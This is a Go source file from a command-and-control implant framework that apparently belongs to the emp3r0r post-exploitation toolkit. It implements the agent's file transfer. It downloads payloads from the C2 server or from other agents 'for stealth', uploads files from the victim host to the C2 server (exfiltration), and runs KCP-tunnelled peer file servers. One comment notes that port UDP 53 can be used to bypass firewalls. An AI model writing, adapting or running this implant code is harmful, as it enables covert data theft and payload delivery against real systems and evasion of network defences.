package c2transport

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/cavaliergopher/grab/v3"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archives"
)

// FetchFile download via grab, if path is empty, return []byte instead
// This will try to download from other agents for better speed and stealth
// when fail, will try to download from CC
func FetchFile(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
	if util.IsFileExist(path) {
		// check checksum
		if crypto.SHA256SumFile(path) == checksum {
			logging.Printf("FetchFile: %s already exists and checksum matches", path)
			return
		}
	}

	// if download_host is given, download from the specified agent
	if download_addr != "" {
		// download from other agent
		logging.Printf("FetchFile: downloading from %s", download_addr)
		err = FetchFileKCP(download_addr, file_to_download, path, checksum)
		if util.IsFileExist(path) {
			// checksum
			if crypto.SHA256SumFile(path) == checksum {
				logging.Printf("FetchFile: %s downloaded via TCP and checksum matches", path)
			}
		}
		return nil, err
	}

	return DownloadViaC2(file_to_download, path, checksum)
}

// DownloadViaC2 download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
		def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(common.RuntimeConfig.AgentUUID), url.QueryEscape(file_to_download))
	logging.Printf("DownloadViaCC is downloading from %s", url)
	retData := false
	if path == "" {
		retData = true
		logging.Printf("No path specified, will return []byte")
	}
	lock := fmt.Sprintf("%s.lock", path)
	if util.IsFileExist(lock) {
		err = fmt.Errorf("%s already being downloaded", url)
		return
	}

	// create file.lock to prevent racing downloads
	if !retData {
		util.CreateFileAgent(lock)
	}

	// if no path specified
	if retData {
		logging.Printf("Downloading %s to memory", url)
		client := def.HTTPClient
		if client == nil {
			err = fmt.Errorf("failed to initialize HTTP client")
			return
		}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC HTTP GET failed to create request: %v", err)
			return nil, err
		}
		req.Header.Set("AgentUUID", common.RuntimeConfig.AgentUUID)
		req.Header.Set("AgentUUIDSig", common.RuntimeConfig.AgentUUIDSig)
		resp, err := client.Do(req)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC HTTP GET: %v", err)
			return nil, err
		}
		if resp.StatusCode != 200 {
			err = fmt.Errorf("DownloadViaCC HTTP GET: %s", resp.Status)
			return nil, err
		}
		data, err := io.ReadAll(resp.Body)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC read body: %v", err)
			return nil, err
		}
		if c := crypto.SHA256SumRaw(data); c != checksum {
			err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", c, checksum)
			return nil, err
		}
		return data, nil
	}

	// use grab
	logging.Printf("Downloading %s to %s", url, path)
	client := grab.NewClient()
	client.HTTPClient = def.HTTPClient
	if client.HTTPClient == nil {
		err = fmt.Errorf("failed to initialize HTTP client")
		return
	}

	req, err := grab.NewRequest(path, url)
	if err != nil {
		err = fmt.Errorf("create grab request: %v", err)
		return
	}
	req.HTTPRequest.Header.Set("AgentUUID", common.RuntimeConfig.AgentUUID)
	req.HTTPRequest.Header.Set("AgentUUIDSig", common.RuntimeConfig.AgentUUIDSig)
	resp := client.Do(req)

	// progress
	t := time.NewTicker(10 * time.Second)
	defer func() {
		t.Stop()
		if !retData && !util.IsExist(path) {
			data = nil
			err = fmt.Errorf("response: %+v, target file '%s' does not exist, downloading from CC may have failed",
				resp.HTTPResponse, path)
		}
		os.RemoveAll(lock)
	}()
	for !resp.IsComplete() {
		select {
		case <-resp.Done:
			err = resp.Err()
			if err != nil {
				err = fmt.Errorf("finished with error: %v", err)
				logging.Print(err)
				return
			}
			if checksum != crypto.SHA256SumFile(path) {
				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
				return
			}
			logging.Printf("saved %s to %s (%d bytes)", url, path, resp.Size())
			return
		case <-t.C:
			logging.Printf("%.02f%% complete", resp.Progress()*100)
		}
	}

	return
}

// SendFile2CC send file to CC, with buffering
// using FTP API
func SendFile2CC(filepath string, offset int64, token string) (err error) {
	logging.Printf("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		err = fmt.Errorf("failed to open %s: %v", filepath, err)
		return
	}
	defer f.Close()

	// seek offset
	_, err = f.Seek(offset, 0)
	if err != nil {
		err = fmt.Errorf("failed to seek %d in %s: %v", offset, filepath, err)
		return
	}

	// connect
	url := fmt.Sprintf("%s%s/%s",
		def.CCAddress,
		transport.Upload2AgentAPI,
		token)
	conn, _, _, err := EstablishC2Connection(url)
	logging.Printf("connection: %s", url)
	if err != nil {
		err = fmt.Errorf("connection failed: %v", err)
		return
	}
	defer conn.Close()

	// open compressor
	compressor, err := archives.Zstd{}.OpenWriter(conn)
	if err != nil {
		err = fmt.Errorf("failed to open compressor: %v", err)
		return
	}
	defer compressor.Close()

	freader := bufio.NewReader(f)
	n, err := io.Copy(compressor, freader)
	if err != nil {
		logging.Printf("failed, %d bytes transfered: %v", n, err)
	}
	return
}

var (
	// AgentFileTransferSessions stores active file transfer sessions between agents
	AgentFileTransferSessions = make(map[string]context.CancelFunc)
	sessionsMutex             sync.Mutex

	// FileServer switch
	FileServerCtx    context.Context
	FileServerCancel context.CancelFunc
)

// FileServer hosts files on an HTTP server with AES-GCM encryption in stream mode
func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err error) {
	defer cancel()

	// start HTTP server on local interface on port-1
	http_port := util.RandInt(10000, 60000)
	listen_addr := fmt.Sprintf("127.0.0.1:%d", http_port)
	http.HandleFunc("/", handleClient)
	server := &http.Server{Addr: listen_addr}

	// start KCP tunnel server that forwards to HTTP server
	// the KCP server will listen on user's specified port while the HTTP server listens on a random port
	// common ports such as UDP 53 can be specified to bypass firewall
	portstr := fmt.Sprintf("%d", port)
	go transport.KCPTunServer(listen_addr, portstr, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)

	go func() {
		<-ctx.Done()
		server.Close()
	}()

	logging.Printf("HTTP secure file server started on port %d", port)
	err = server.ListenAndServe()
	if err != nil && err != http.ErrServerClosed {
		return fmt.Errorf("FileServer: failed to start HTTP server: %v", err)
	}
	logging.Printf("FileServer on %d exited", port)
	return nil
}

func handleClient(w http.ResponseWriter, r *http.Request) {
	file_path := r.URL.Query().Get("file_path")
	checksum := r.URL.Query().Get("checksum")

	download_path := fmt.Sprintf("%s/%s", common.RuntimeConfig.AgentRoot, util.FileBaseName(file_path))
	// if file does not exist, download it from CC
	if !util.IsFileExist(file_path) {
		logging.Printf("handleClient: file %s (%s) does not exist, downloading from CC", file_path, checksum)
		_, err := DownloadViaC2(file_path, download_path, checksum)
		if err != nil {
			logging.Printf("handleClient: failed to download file from CC: %v", err)
			http.Error(w, "Failed to download file from CC", http.StatusInternalServerError)
			return
		}
		file_path = download_path // should serve the downloaded file
	}

	// serve the file
	http.ServeFile(w, r, file_path)
}

// FetchFileKCP requests and downloads a file from an HTTP server to a specified path
func FetchFileKCP(address, filepath, path, checksum string) (err error) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// start local KCP client tunnel to connect to KCP server then HTTP server
	kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
	go transport.KCPTunClient(address, kcp_listen_port, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)

	// wait until port is open
	for !netutil.IsPortOpen("127.0.0.1", kcp_listen_port) {
		logging.Printf("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
		time.Sleep(time.Second)
	}

	// use grab to download the file
	client := grab.NewClient()
	req, err := grab.NewRequest(path, fmt.Sprintf("http://127.0.0.1:%s/?file_path=%s&checksum=%s", kcp_listen_port, url.QueryEscape(filepath), url.QueryEscape(checksum)))
	if err != nil {
		return fmt.Errorf("RequestAndDownloadFile: failed to create grab request: %v", err)
	}
	resp := client.Do(req)

	// progress
	t := time.NewTicker(5 * time.Second)
	defer t.Stop()
	for !resp.IsComplete() {
		select {
		case <-resp.Done:
			err = resp.Err()
			if err != nil {
				return fmt.Errorf("RequestAndDownloadFile: download finished with error: %v", err)
			}

			// if checksum is given, check it
			if checksum != "" {
				if checksum != crypto.SHA256SumFile(path) {
					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
				}
			}
			logging.Printf("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
			return nil
		case <-t.C:
			logging.Printf("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
		}
	}

	return nil
}

// CancelFileTransfer cancels an ongoing file transfer session
func CancelFileTransfer(clientAddr, filepath string) {
	sessionID := fmt.Sprintf("%s:%s", clientAddr, filepath)
	sessionsMutex.Lock()
	defer sessionsMutex.Unlock()

	if cancel, exists := AgentFileTransferSessions[sessionID]; exists {
		cancel()
		logging.Printf("File transfer session for %s canceled", sessionID)
		delete(AgentFileTransferSessions, sessionID)
	} else {
		logging.Printf("No active file transfer session for %s", sessionID)
	}
}
